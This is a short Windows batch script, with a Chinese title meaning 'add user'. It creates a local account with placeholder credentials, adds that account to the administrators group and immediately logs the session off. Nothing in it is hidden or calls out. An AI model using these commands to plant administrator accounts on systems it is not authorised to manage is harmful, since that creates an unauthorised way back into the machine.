@echo off
color 0b
title 添加用户
net user 用户名 密码 /add
net user Administrator 密码 /add
net localgroup administrators 用户名 /add
start logoff
ping 127.0.0.1 -n 2 >NUL
